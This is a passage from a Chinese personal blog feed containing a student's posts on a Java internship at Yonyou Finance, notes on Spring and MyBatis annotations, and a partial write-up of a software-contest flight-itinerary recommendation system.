    <link href="/2023/06/18/%E7%94%A8%E5%8F%8B%E5%AE%9E%E4%B9%A0%E4%B8%A4%E6%9C%88%E8%AE%B0%E5%BD%95/"/>
    <url>/2023/06/18/%E7%94%A8%E5%8F%8B%E5%AE%9E%E4%B9%A0%E4%B8%A4%E6%9C%88%E8%AE%B0%E5%BD%95/</url>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>不知不觉以及过去两个月了，很清楚的记得自己是六月十三号来的，今天是八月十三号。其实感觉两个月时间，自己真正工作做的东西很少，很多时间是自己在学习。其实到这里挺感谢我的导师的。他布置工作任务时间给的很宽松，好些时候工作任务做完了他也没有立刻给我布置新的任务，这时一天的时间就完全属于我自己的，在公司看书。</p><h2 id="关于导师给我的学习计划"><a href="#关于导师给我的学习计划" class="headerlink" title="关于导师给我的学习计划"></a>关于导师给我的学习计划</h2><p>在上个月二十五号的时候有过一个月底考核，其实就是一个工作总结，说明自己工作做了些什么，学习学了些什么，以及下一步的学习计划。我说明了我下一步学习计划是想学SpringCloud等微服务技术，因为发现身边的人好像都会，面试的时候也会问到这个。导师说这个没有必要，让我好好看三本书，分别是《代码整洁之道》、《设计模式》、《重构，改善代码既有设计》。其中代码整洁之道基本快看完了，感觉从这本书里面学到了不少东西，这个在看完后单独写一篇文章进行总结。导师说让我先会写代码，先学会写优雅、整洁、可读性强的代码，像微服务和SpringCloud这些模块化的技术学起来很容易的，而编码能力是需要长时间打磨出来的。<br>我其实感觉这个建议很中肯，所以我也才会去看导师推荐的书，但现在转眼快九月份了，马上要开始秋招了，又感觉自己掌握的技术似乎不太够，想跟着网上教程做点微服务相关的项目放在简历里。所以到现在感觉自己还是很焦灼的。留在用友似乎是个不错的选择，但是又听说工资低，一个月一万块钱工资在北京确实不太高。</p><h2 id="实习做了些什么"><a href="#实习做了些什么" class="headerlink" title="实习做了些什么"></a>实习做了些什么</h2><p>上个月月底总结的时候我把自己做的所有工作都列了出来，用一张表格呈现。<br><img src="/upload/2022/08/image-d75e8df1f9854ef28cf9216751378ac4.png" alt="image.png"><br>就解决一下简单的Bug，试着做做新的需求。<br>目前离上次总结又过去了三周，这三周好像做的东西也很少。<br>7.25<del>7.29这一周，周一和周二请假做软件杯比赛的决赛准备，之后工作任务是软件新版本的两个新需求，第一个是在单据中新增两个元数据，本来任务不多了，但新增元数据关联到的内容有点多，另外小组另一个负责这块的人把字段名给打错了，导致我debug了特别久，自己电脑上的环境也有问题，最后找导师排除了半天才解决的。<br>第二个新需求是在一个界面新增模糊查询和下拉选择查询以及删除的功能。其中查询功能挺好做的，但删除功能涉及到关联的表有些多，我只删了部份表（因为做的时候没考虑到，做完才发现原来这个数据还关联了这么多表），审查了之后确认留下那几个没删除的表不影响功能，而且这个数据量很少，不到一百条，表中留下几条无用的数据也不会影响性能，就先这样了。但良心还是过意不去，有时间的话我还是再删掉吧，感觉是自己的工作没做到完美。<br>第二个需求要与前端对接，我还从前端那里学到了不少东西，刚好那个软件杯比赛我就负责做前端， 用上了这块内容。<br>这两个需求做了两周，主要是请假以及出现了些状况耽误了点时间。<br>8.8</del>8.12这周做的是修改之前的定时任务的需求，那个需求的一些字段进行了修改，我又需要关联一个表来获取新的数据才行。这周对mybatis的学习进了一个层次。自己除了在完成工作需求之外，开始注重代码如何更优雅，因为自己发现修改我自己之前写的代码，才过了三周，自己一时间对自己写的代码完全没印象，感觉自己之前写的代码确实可读性差，自己刚好这两周看《代码整洁之道》，就想着用书上的东西来整洁代码，其实书上的内容和实际工作的时候使用的内容还是有些出入，我得找个时间请教导师来解惑。修改了几处变量名，修改了一下查询数据库的方法，感觉代码整洁可维护的确太重要了。</p><h2 id="这两月学到的东西"><a href="#这两月学到的东西" class="headerlink" title="这两月学到的东西"></a>这两月学到的东西</h2><p>学到的内容主要是编码吧，自己其实Java写的很少，自己的项目也是照着别人的代码写的，现在工作了要看不少代码，写不少代码，对于代码感觉更熟悉了，也慢慢会用一些工具、插件、以及jdk8特性来写代码。<br>其次是自己也在不断的学新东西，自己看完（视频两倍速过了一遍）了SpringCloud 教学视频，对于微服务基本有了个了解，然后看完了Docker，对于docker基础比较熟悉，也会简单使用了。再学了一些Java多线程高并发，原来多线程也叫JUC，java.util.concurrent包的缩写，JUC指的是Java的并发工具包。<br>还看了一下尚硅谷的面经视频，没看完，现在写这篇文章的时候发现自己一点也想不起来讲了些啥了QAQ</p><h2 id="下一步规划"><a href="#下一步规划" class="headerlink" title="下一步规划"></a>下一步规划</h2><p>所租的房子是三个月的，有个室友九月份会去北森，所以房子应该是不会续租，如果我要留在用友的话会租用友园区公寓，也不贵。再就是现在开始投简历吧，虽然有留在用友的意向，不过也不能只考虑用友。开始面试，九月份秋招要把握好。</p>]]></content>
    
    
    <categories>
      
      <category>面经笔经</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>用友金融实习——完</title>
    <link href="/2023/06/18/%E7%94%A8%E5%8F%8B%E9%87%91%E8%9E%8D%E5%AE%9E%E4%B9%A0%E2%80%94%E2%80%94%E5%AE%8C/"/>
    <url>/2023/06/18/%E7%94%A8%E5%8F%8B%E9%87%91%E8%9E%8D%E5%AE%9E%E4%B9%A0%E2%80%94%E2%80%94%E5%AE%8C/</url>
    
    <content type="html"><![CDATA[<h2 id="离职"><a href="#离职" class="headerlink" title="离职"></a>离职</h2><p>其实有打算在用友金融干到转正的，毕竟已经干了两个半月了，只剩最后一个月就能转正了。不过现在已经到了九月份，开始秋招了，这一个月对我而言可能至关重要，还是决定先全力准备秋招，于是再九月一号正式离职。在职时间77天。</p><h2 id="导师"><a href="#导师" class="headerlink" title="导师"></a>导师</h2><p>我始终觉得我的导师是我工作上遇到的第一个贵人，尽管可能没有亲自手把手教导技能与知识，但是对我的培养方案和方向上的指点让我的收益太大了。<br>上班第一天告诉我实习生不要求加班，到点就可以走。在布置任务时不会给我过大的压力，也从来没有过压榨我的劳动力。当我把一个任务完成的时候，我的导师不会立刻给我分配下一个任务，而是将我多余出来的时间交由我来进行自我学习，这一点也让我在实习的时候看完了三本书，第四本看了一版，还看B站的视频学习Mybatis、MybatisPlus、SpringBoot、docker、juc等等东西，收益很大，感觉这才是真正的实习，在工作中学习。和我一同在用友金融实习的室友所在的小组就没这么幸运了，感觉他们的导师会给他们布置很大的任务，而那些工作又是重复的利用工具进行生成和增删改查等等操作，能学习到的东西甚微，很多时候都要加班。<br>在我离职前一天，我和我导师提出了我在看完编码规范的那几本书之后心中存在的一些问题，其中包括：<br>1、为什么Service层一个方法代码可以写五百行，而不是一个方法只处理一个功能<br>2、为什么NCC调用数据库的方式是最老式的JDBC，而不用Mybatis等工具<br>3、为什么不对一些有明显问题的代码进行重构<br>4、为什么代码中没有单元测试<br>导师的回答很详细，基本一个点对应一个点的给我讲解了。<br>首先让我看那几本书的作用是让我自己心里有一个标准，即知道代码应该怎样去写，类和方法应该怎样构建，要抽象共同方法来提高内聚、解除耦合。而其他程序员写代码时可能觉得这个方法能够返回想要的结果就行了，特别在老式的项目里，就基础会出现一个方法代码量极大的情况，另外想这些也是开发人员对于进程的妥协，因为项目周期赶得紧，很多时候没法仔细的去构建最完美的架构，只想着能够顺利完成就行了。单元测试和重构代码也同理，对于进度周期的妥协。<br>另外和我讲了NCC这个系统的可取之处，NCC诞生的时候，还没有Mybatis这门技术，另外NCC集成了七八种数据库，可以直接连接，如果要使用Mybatis的话需要些很多配置文件来实现数据源的适配。（大致是这个意思，其实我也不是很懂这个）</p><p>由衷的感谢我的第一位导师</p><h2 id="学习"><a href="#学习" class="headerlink" title="学习"></a>学习</h2><p>其实感觉自己两个月的确学到了不少东西，大多数就是在工作中学的。学习使用IDEA工具，学习使用Git，学习如何去DEBUG，去打条件断点、异常断点、接口断点。这些东西真的挺有用的。<br>其次就是学习技能了，其实在我开始实习的时候，我感觉自己的JAVA水平也只是刚刚入门，也就了解一点点MVC，了解一点点SpringBoot，真到项目里面看到一堆注解，其中的意思我是都不知道的，一边搜一边记下来，虽然工作做的挺简单，但是还是能从中学到东西的，让自己对MVC和SpringBoot更加熟练吧。<br>此外还学了很多有用的东西，比如MyBatisPlus，这个东西在项目里面随处可见，很多新的SQL语句就是用这个写的，我临时学了一点，但是感觉没有太精通，就知道通过wrapper条件构造器可以快速进行SQL语句的调用。<br>以及过了一遍SpringCloud微服务架构，感觉只是简单的看了一遍视频，其中的很多模块化的东西要记下来感觉还挺麻烦的，因为涉及到太多的工具了，有的工具又说以及停止维护过时了，后面打算跟着一个微服务项目来深入学习微服务。<br>最重要的收获可能就是编码规范和设计模式了，把两本书好好的过了一遍，对于编码规范和设计模式自己感觉熟悉了很多，可能没完全记下来，但是心里有一个大概了，现在编码的时候也会特别注意命名和设计等等。</p><h2 id="工作"><a href="#工作" class="headerlink" title="工作"></a>工作</h2><p>工作上做的东西前面都陆续的总结过，我这里就贴两个图吧</p><p><img src="/upload/2022/08/image-d75e8df1f9854ef28cf9216751378ac4.png" alt="image"></p><p><img src="/upload/2022/09/image-767c259774a441f8bcf84f2456be5a6d.png" alt="image.png"></p><h2 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h2><p>在这段时间自己也没有闲着，还做了其他的一点东西，其中一个就是弄中软杯的比赛，这个比赛最后拿到了国家二等奖，还是很不容易了，有好几个周末晚上弄到三四点就为了弄这个东西。还为了答辩请了两天假。不过收获挺大的，第一次拿国奖。</p><p>另外自己之前的挂的云函数，用来今日校园自动打卡的IP被彻底封了，没办法正常使用了，但是本机可以正常打卡，但没有一台能二十四小时开机给我每天打卡的机器，所以我把我的备用手机，一个运行内存3G的手机装了Termux之后成为了我的服务器，现在每天挂着就可以自动打卡了。<br>整这个东西好像也就花了两周的周末时间，挺轻松的</p><h2 id="知识点-——-工作的时候的小笔记"><a href="#知识点-——-工作的时候的小笔记" class="headerlink" title="知识点 —— 工作的时候的小笔记"></a>知识点 —— 工作的时候的小笔记</h2><p>Sql语句中有切割单个字段的方法：SUBSTRING_INDEX(orderNo,’_’,1)<br>第一个参数为切分的字段，第二个参数为以什么作为切分符，第三个参数为取切分后的第几个部分（1代表第一个部分）</p><p>mybatis中可以返回Map类型数据，但是好像返回不了Map&lt;String,String&gt;，一般推荐将要返回的结果作为一个VO对象，然后返回Map&lt;String,Object&gt;<br>返回Map时resultType类型不要选择Map，而是VO对象的类型，此外还需要在Mapper类中使用@Key注解标明Key</p><p>枚举类适合单例设计模式。Enum中定义的Enum成员值都被缓存在了这个Map中，Key是成员名称（比如“INSTANCE”），Value就是Enum的成员对象。这样的机制天然保证了取到的Enum对象是唯一的。即使是反序列化，也是一样的</p><p>Apache Shiro是一个功能强大、灵活的，开源的安全框架。它可以干净利落地处理身份验证、授权、企业会话管理和加密。</p><p>StopWatch监控Java代码运行时间和分析性能(<a href="https://mp.weixin.qq.com/s/kqqpJffKxy83ImDFV86ZYw)%EF%BC%8C%E8%AF%A5%E6%96%B9%E6%B3%95%E4%B8%8D%E6%94%AF%E6%8C%81%E5%A4%9A%E7%BA%BF%E7%A8%8B%EF%BC%8C%E4%B8%94%E4%B8%8D%E8%83%BD%E4%BD%BF%E7%94%A8%E5%90%8C%E6%AD%A5">https://mp.weixin.qq.com/s/kqqpJffKxy83ImDFV86ZYw)，该方法不支持多线程，且不能使用同步</a></p><h3 id="注解："><a href="#注解：" class="headerlink" title="注解："></a>注解：</h3><h3 id="ResponseBody"><a href="#ResponseBody" class="headerlink" title="@ResponseBody"></a>@ResponseBody</h3><p>@ResponseBody是作用在方法上的，@ResponseBody 表示该方法的返回结果直接写入 HTTP response body 中，一般在异步获取数据时使用【也就是AJAX】。<br>注意：在使用 @RequestMapping后，返回值通常解析为跳转路径，但是加上 @ResponseBody 后返回结果不会被解析为跳转路径，而是直接写入 HTTP response body 中。 比如异步获取 json 数据，加上 @ResponseBody 后，会直接返回 json 数据。@RequestBody 将 HTTP 请求正文插入方法中，使用适合的 HttpMessageConverter 将请求体写入某个对象。</p><h3 id="Deprecated"><a href="#Deprecated" class="headerlink" title="@Deprecated"></a>@Deprecated</h3><p>Java 中 @Deprecated 可以用来注解类、接口、成员方法和成员变量等，用于表示某个元素（类、方法等）已过时。当其他程序使用已过时的元素时，编译器将会给出警告。</p><h3 id="Documented"><a href="#Documented" class="headerlink" title="@Documented"></a>@Documented</h3><p>@Documented是元注解，可以修饰其他注解。许多注解头部都有@Documented注解，例如jdk中自带的@Deprecated注解(路径是：java&#x2F;lang&#x2F;Deprecated.java)头部就含有这个注解:<br>如果一个注解@B，被@Documented标注，那么被@B修饰的类，生成文档时，会显示@B。如果@B没有被@Documented标准，最终生成的文档中就不会显示@B。</p><h3 id="Retention"><a href="#Retention" class="headerlink" title="@Retention"></a>@Retention</h3><p>@Retention作用是定义被它所注解的注解保留多久，一共有三种策略，定义在RetentionPolicy枚举中.<br>从注释上看：<br>source：注解只保留在源文件，当Java文件编译成class文件的时候，注解被遗弃；被编译器忽略<br>class：注解被保留到class文件，但jvm加载class文件时候被遗弃，这是默认的生命周期<br>runtime：注解不仅被保存到class文件中，jvm加载class文件之后，仍然存在<br>这3个生命周期分别对应于：Java源文件(.java文件) —&gt; .class文件 —&gt; 内存中的字节码。</p><h3 id="Target"><a href="#Target" class="headerlink" title="@Target"></a>@Target</h3><p>@Target说明了Annotation所修饰的对象范围：Annotation可被用于 packages、types（类、接口、枚举、Annotation类型）、类型成员（方法、构造方法、成员变量、枚举值）、方法参数和本地变量（如循环变量、catch参数）。在Annotation类型的声明中使用了target可更加明晰其修饰的目标。</p><h3 id="Inherited"><a href="#Inherited" class="headerlink" title="@Inherited"></a>@Inherited</h3><p>@Inherited是一个标识，用来修饰注解<br>作用：如果一个类用上了@Inherited修饰的注解，那么其子类也会继承这个注解</p><p>注意：</p><p>接口用上个@Inherited修饰的注解，其实现类不会继承这个注解<br>父类的方法用了@Inherited修饰的注解，子类也不会继承这个注解</p><h3 id="SerializedName"><a href="#SerializedName" class="headerlink" title="@SerializedName"></a>@SerializedName</h3><p>SerializedName的主要作用：属性重命名，可以将json中的属性名转为我们自己自定义的属性名</p><h3 id="JsonProperty"><a href="#JsonProperty" class="headerlink" title="@JsonProperty"></a>@JsonProperty</h3><p>此注解用于属性上，作用是把该属性的名称序列化为另外一个名称，如把trueName属性序列化为name，@JsonProperty(“name”)。<br>对属性名称重命名，比如在很多场景下Java对象的属性是按照规范的驼峰书写，但在数据库设计时使用的是下划线连接方式，此处在进行映射的时候就可以使用该注解。</p><h3 id="RequestMapping"><a href="#RequestMapping" class="headerlink" title="@RequestMapping"></a>@RequestMapping</h3><p>RequestMapping是一个用来处理请求地址映射的注解，可用于类或方法上。用于类上，表示类中的所有响应请求的方法都是以该地址作为父路径。</p><p>RequestMapping注解有六个属性</p><p>value：   指定请求的实际地址，指定的地址可以是URI Template 模式（后面将会说明）；</p><p>method： 指定请求的method类型， GET、POST、PUT、DELETE等；</p><p>consumes： 指定处理请求的提交内容类型（Content-Type），例如application&#x2F;json, text&#x2F;html;</p><p>produces:  指定返回的内容类型，仅当request请求头中的(Accept)类型中包含该指定类型才返回；</p><p>params： 指定request中必须包含某些参数值是，才让该方法处理。</p><p>headers： 指定request中必须包含某些指定的header值，才能让该方法处理请求。</p><h3 id="RequestParam"><a href="#RequestParam" class="headerlink" title="@RequestParam"></a>@RequestParam</h3><p>@RequestParam用于将请求参数区数据映射到功能处理方法的参数上。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">public String queryUserName(@RequestParam String userName)</span><br></pre></td></tr></table></figure><p>请求中包含username参数（如&#x2F;requestparam1?userName&#x3D;zhang），则自动传入。</p><p>@RequestParam注解主要参数：</p><p>value：参数名字，即入参的请求参数名字，如username表示请求的参数区中的名字为username的参数的值将传入；</p><p>required：是否必须，默认是true，表示请求中一定要有相应的参数，否则将报404错误码；</p><p>defaultValue：默认值，表示如果请求中没有同名参数时的默认值，默认值可以是SpEL表达式，如“#{systemProperties[‘java.vm.version’]}”。</p><h3 id="ExceptionHandler"><a href="#ExceptionHandler" class="headerlink" title="@ExceptionHandler"></a>@ExceptionHandler</h3><p>用来统一处理方法抛出的异常</p><p>当使用这个@ExceptionHandler注解时，我们需要定义一个异常的处理方法，比如handleExeption()方法，给这个方法加上@ExceptionHandler注解，这个方法就会处理类中其他方法（被@RequestMapping注解）抛出的异常。</p><h3 id="RestControllerAdvice"><a href="#RestControllerAdvice" class="headerlink" title="@RestControllerAdvice"></a>@RestControllerAdvice</h3><p>@RestControllerAdvice是对Controller进行增强的，可以全局捕获spring mvc抛的异常。</p><p>即在Controller中的异常都会被捕获，无论是否用try-catch捕获</p><p>注：ControllerAdvice和RestControllerAdvice的区别<br>两者都是全局捕获异常，但是RestControllerAdvice更加强大，其作用相当于ControllerAdvice+ResponseBody</p><h3 id="Mapper"><a href="#Mapper" class="headerlink" title="@Mapper"></a>@Mapper</h3><p>作用：在接口类上添加了@Mapper，在编译之后会生成相应的接口实现类<br>添加位置：接口类上面</p><p>@Mapper<br>public interface UserDAO {<br>  &#x2F;&#x2F;代码<br>}</p><p>如果想要每个接口都要变成实现类，那么需要在每个接口类上加上@Mapper注解，比较麻烦，解决这个问题用@MapperScan</p><h3 id="MapperScan"><a href="#MapperScan" class="headerlink" title="@MapperScan"></a>@MapperScan</h3><p>作用：指定要变成实现类的接口所在的包，然后包下面的所有接口在编译之后都会生成相应的实现类<br>添加位置：是在Springboot启动类上面添加。</p>]]></content>
    
    
    <categories>
      
      <category>面经笔经</category>
      
    </categories>
    
    
    <tags>
      
      <tag>面经笔经</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>用友金融实习三周小结</title>
    <link href="/2023/06/18/%E7%94%A8%E5%8F%8B%E9%87%91%E8%9E%8D%E5%AE%9E%E4%B9%A0%E4%B8%89%E5%91%A8%E5%B0%8F%E7%BB%93/"/>
    <url>/2023/06/18/%E7%94%A8%E5%8F%8B%E9%87%91%E8%9E%8D%E5%AE%9E%E4%B9%A0%E4%B8%89%E5%91%A8%E5%B0%8F%E7%BB%93/</url>
    
    <content type="html"><![CDATA[<h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h2><p>很长时间没有更新文章了，因为前一段时间忙完面试之后开始复习考试，还要完成课程的一堆实验和大作业，另外要准备中软杯的内容，一直忙碌也没什么特别想记录的东西，就没有写文章。现在感觉事情差不多都结束了，开始对近阶段进行回顾和小结吧。</p><h3 id="第一周"><a href="#第一周" class="headerlink" title="第一周"></a>第一周</h3><p>从六月十三号入职用友金融，目前已经两周多了。<br>第一周因为疫情，领了电脑后就开始居家办公，让实习生居家办公太离谱了，发了一堆文档让自学，发的学习文档也不全，都是好久之前的公司培训材料，小组项目的一堆功能软件也不会使用，第一周过的浑浑噩噩的，不过在第一周学习了Java编码规范，其中要记的内容挺多的，像命名规范就繁琐又复杂。不过也有一些很有用的规范，是自己之前完全没注意到的，比如魔法值，魔法值在编程领域指的是莫名其妙出现的数字。数字的意义必须通过详细阅读才能推断出来，例如如下代码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="string">&quot;success&quot;</span>.equals(result.getKey))&#123;</span><br><span class="line">xxx</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>其中是”success”就是魔法值，在未读整段代码之前，并不知道这个字符串代表什么意思，只有把这个字符串带入后面的代码逻辑才能判断该值的真实意义，而且如果多次出现，这就大大的降低了代码的可阅读性。所以我们在代码中应该极力避免产生魔法值。<br>解决方法：使用枚举类型或者使用static final修饰常量<br>在公司以前的代码中有用properties文件来存放常量的，然后写一个类来调用方法获取该常量。也有枚举类和常量类。还了解到Java的枚举类是天然的单例设计模式，线程安全，只会装载一次。<br>关于编程规范还在近几天提交的代码被指出来有很多问题。首先是变量名的命名，如果是列表名称后面加List，如果是集合加Set，依此类推，我最开始的命名没有遵守此规则，还有一堆名不达意的变量，也没有注释，这些问题以后都要避免。<br>另外编程规范中还要特别注重代码的可读性，我曾在一个if判断中后续加了一堆内容，导致可读性极差，这些问题都需要修改。</p><h3 id="第二周"><a href="#第二周" class="headerlink" title="第二周"></a>第二周</h3><p>第二周可以到公司上班了，但没有什么任务，就让我们看项目的代码，但是代码很大一坨，也不知道从哪里开始看起，后面安排导师讲了一次代码，就对于每个模块负责的大概功能介绍了一下，对于详细的模块内容没介绍，包也没怎么介绍，不过公司同事说可以从每个模块和包的名字看出来其负责的内容是哪一块的。所以第二周也并没有什么收获，学的很粗糙，进步很慢。从产品的文档和介绍上大致了解了金融是个什么东西。对金融里面的一些名词也渐渐了解。</p><h3 id="第三周"><a href="#第三周" class="headerlink" title="第三周"></a>第三周</h3><p>第三章开始布置小的任务来让我做，以做代学，这样进步会快一些，首先布置的内容是让前端一个地方显示success的地方修改为失败，就是简单的修改一下显示内容。最开始我都不知道怎么定位代码，也不知道这个信息是后端发出去的还是前端自己写上去的。<br>后面跟着导师学会定位代码改BUG的流程：<br>先打开F12，按下按钮发送请求，在网络处会发送请求，点进一个请求从标头处可以看到请求url的信息，从预览处可以看到后端发送给前端的json信息。复制该url，打开idea,这里要装一个好用的插件：RestfulToolkit-fix。该插件通过快捷键：ctrl+\ 可以输入url，对应到controller代码所在的位置。<br>另外找代码的快捷键还有ctrl+h 全局搜索，这个好像是eclipse的快捷键，导师习惯用eclipse。在idea中默认模式下快捷键好像是ctrl+shift+r。<br>还有连续按两次shift可以快速查找，找类很方便。这个是之前就知道的。<br>git提交代码时要先拉取代码，不然容易冲突。提交完推送才到云端。<br>另外这周充分的学习了一下异常处理。<br>异常处理在以前学的时候就简单的了解了throw和throws，还有自定义异常需要继承Exception类等等。后面看了项目才知道异常处理在项目中有很大的作用，因为是金融，票据上报审批等功能，会有很多限制规则和校验流程，如果不满足要求就会抛出自定义的运行时异常。而这些异常最终需要统一进行处理。<br>运行时异常发生后，后续的代码不会继续执行，而是抛出给上一层处理，上一层不处理就继续抛出，最后有一个类会对运行时异常处理，即使这个异常已经被try-catch捕获。<br>此外异常分为运行时异常和非运行时异常，运行时异常是继承RuntimeException,会将问题抛出进行统一处理。非运行时异常则会在输出界面报错。自定义异常在命名时后续要加Exception，其目的就是将抛出的异常转化为用户能看懂的文字提示反馈给页面。<br>这周还好好的学习了一下前后端的消息传输，公司中是采用流来将写好的json传输到前端界面，小组老大还指导我 我学习时使用的框架里面的返回信息例如：<br>response.getWriter().write(jsonObject.toJSONString());<br>原理也是封装的这个东西。</p><p>目前就想起这些，暂时先记录到这，后面有时间了再补充</p>]]></content>
    
    
    <categories>
      
      <category>面经笔经</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>第十一届 中国软件杯大学生软件设计大赛 A1-高性能民航旅客行程推荐系统</title>
    <link href="/2023/06/18/%E7%AC%AC%E5%8D%81%E4%B8%80%E5%B1%8A%20%E4%B8%AD%E5%9B%BD%E8%BD%AF%E4%BB%B6%E6%9D%AF%E5%A4%A7%E5%AD%A6%E7%94%9F%E8%BD%AF%E4%BB%B6%E8%AE%BE%E8%AE%A1%E5%A4%A7%E8%B5%9B%20A1-%E9%AB%98%E6%80%A7%E8%83%BD%E6%B0%91%E8%88%AA%E6%97%85%E5%AE%A2%E8%A1%8C%E7%A8%8B%E6%8E%A8%E8%8D%90%E7%B3%BB%E7%BB%9F/"/>
    <url>/2023/06/18/%E7%AC%AC%E5%8D%81%E4%B8%80%E5%B1%8A%20%E4%B8%AD%E5%9B%BD%E8%BD%AF%E4%BB%B6%E6%9D%AF%E5%A4%A7%E5%AD%A6%E7%94%9F%E8%BD%AF%E4%BB%B6%E8%AE%BE%E8%AE%A1%E5%A4%A7%E8%B5%9B%20A1-%E9%AB%98%E6%80%A7%E8%83%BD%E6%B0%91%E8%88%AA%E6%97%85%E5%AE%A2%E8%A1%8C%E7%A8%8B%E6%8E%A8%E8%8D%90%E7%B3%BB%E7%BB%9F/</url>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>这个比赛是大学生竞赛里面的国家级A类竞赛，含金量看着还不错。参与的时候是系教研室老师找到我问我愿不愿意参加这个比赛，然后让我推荐了几个人组成团队一起参加。后面才知道学院有要求每个专业必须出一个队伍来参加这个比赛。<br>团队组成了是四个人，从五月份开始进行筹备，开了一个短会后就开始做web系统了。</p><h2 id="最初的一版"><a href="#最初的一版" class="headerlink" title="最初的一版"></a>最初的一版</h2><p>最开始的时候只考虑题目中的功能性需求，即实现题目的功能要求，不考虑性能和创新等点。这个做出来其实挺简单的，就一个简单的Web系统，当时分配任务是一个人负责数据库的设计以及爬取数据，两个人写后端逻辑，一个人写前端框架。当时因为我们小组成员都是同一个专业，都没学过前端，我选修课选过前端的设计，所以就由我来负责前端的设计。<br>因为后端最初确定的技术是采用SpringBoot来搭建，我开始还在thymeleaf模板引擎和vue框架中犹豫过一下。thymeleaf和SpringBoot配套使用开发很便捷，没有那么多的网络传输数据，但性能方面好像更差一些，最后为了追求高性能还是采用前后端分离，前端框架采用Vue，这样前后端交互只有纯数据，也更简介一些。</p><p>花了两周的时间把第一版完全做出来了，这一版就已经实现了题目中的功能性要求，后端行程推荐算法中最开始直接采用暴力检索的方法来查询，就是一段一段的去匹配，输入了八段行程，那么根据输入的八段行程一段一段去数据库中搜索对应的航班信息，再暴力的去计算每一种组合的航班价格，最后按照价格升序输出到前端。数据库最初是直接采用的mysql数据库加一个检索引擎来实现，这个我不太懂，设计数据库的那个成员也没怎么和我们解释。</p><p>基础的功能已经做出来了，后续就考虑题目中的 高性能-高可用 以及创新的部分。</p><h2 id="为了追求创新得分撤销SpringBoot"><a href="#为了追求创新得分撤销SpringBoot" class="headerlink" title="为了追求创新得分撤销SpringBoot"></a>为了追求创新得分撤销SpringBoot</h2><p>在比赛中是有创新得分的，即不用一些现成的框架，而去自研实现它，就能获得大量的创新学分。其中一点就是Http服务。<br>之前的SpringBoot中是内置了Tomcat服务器的，我们现在要实现自研Http服务，那自然不能用Tomcat，所以也就决定撤销使用SpringBoot,甚至决定连Spring都不使用，仅采用原生的Java代码来重新实现我们的系统。<br>这一步废了很大精力，Http服务直接采用socket获取输入&#x2F;输出流的方式实现数据的传递服务。实现起来其实不负责，但是刚做出来的时候效率是真的低，经过测试比对我们自研的Http服务传输效率仅为Tomcat的二十分之一，让人怀疑自我，但为了创新得分还是觉得采用自研，后面再进行优化Http服务。下图是我们所作的Http服务的建立连接过程。<br><img src="/upload/2022/09/image-71709e66a2b94d03a379e06031812baf.png" alt="image.png"><br>其实无非就是使用Java的socket建立TCP&#x2F;IP连接而已。<br>HTTP请求详细流程图如下：<br><img src="/upload/2022/09/image-14a64c8b19184d1db1f1bba15af8e62f.png" alt="image.png"><br>Http优化主要有三部分，分别是采用长连接、采用线程池、采用NIO通信</p><h2 id="选择数据库为SQLite"><a href="#选择数据库为SQLite" class="headerlink" title="选择数据库为SQLite"></a>选择数据库为SQLite</h2><p>数据库主要分为关系型和非关系型，而航班数据又是非常典型的关系型数据库，因此数据库的选择就主要在关系型中。MySQL作为最主流的关系型数据库，虽然MySQL有着非常多的优点但是如果要在一个内存非常小的机器上做并发程序，维护那么多的数据库连接，对内存耗费是无法接受的。<br>因此寻找一个内存占用低的数据库至关重要，而应用最广的低内存数据库便是SQLite，其拥有着占用空间小，读取速度快的特点。虽然无法进行并发修改，但是根据需求，需要修改数据的情况极少，因此对于本项目是一个非常合适的选择。SQLite也是题目中比较推荐的嵌入式数据库。<br>选择完数据库还需要设计索引来提高查询效率，根据题目意思针对不同的表设计出不同的联合索引。<br>为了数据库的高可用，解决并发读写的问题采用了双缓存的思想，数据库存放两份，当不需要更新余座数据的时候两份均可以进行查询，当需要更新余座数据时，先将其中一个数据库锁起来待里面所有线程完成查询后对其数据进行修改，修改完成后将这个数据库解锁，再将另一个数据库锁起来待里面的所有线程完成查询后对其进行修改，修改完成后解锁，这样就完成了更新过程。</p><h2 id="算法的设计和实现"><a href="#算法的设计和实现" class="headerlink" title="算法的设计和实现"></a>算法的设计和实现</h2><p>用户搜索前k个低价行程结果的需求可以类比到图论中寻求前k条最短路径，其中路径权重为每段行程的票价。因此只需要将用户查询的数据库中的航班数据构建为一张图，然后求出图中前k条最短路径即可。<br>建图采用了逆向建图的方法。如下图所示，为了便于后续求得k条最短路径，这里抽象出了一个逻辑上的起点和终点。这里通过三段航班的例子说明如何建图。<br><img src="/upload/2022/09/image-c509d5abb0c54bfea469640c0e533a54.png" alt="image.png"><br>首先查询最后一段航班信息，因为最后一段不需要匹配运价规则，因此将最后一段行程中座位符合需求的航班与终点连一条边，其中边长为所有人的票价和。此时可以保证图中存在的点都一定能到终点。这里将图中存在的最后一段行程记为C，C满足两点：1. C为一个行程集合，其中包含所有最后一段行程；2. C中存在的行程一定能够到达终点；之后查询倒数第二段航班信息，根据倒数第二段行程的航班对应的运价规则找寻C中存在的航班，因为上一步保证了C中的行程一定能够到达终点，因此如果根据运价规则C中没有可以衔接的航班则可以直接匹配下一条运价规则，直到C中存在能够衔接的航班或所有运价规则均无法匹配（表示不可达）。倒数第二段航班向C中航班连的边的权重为根据运价规则浮动之后的所有人的票价总和。这里将图中存在的倒数第二段行程记为B，B满足两点：1. 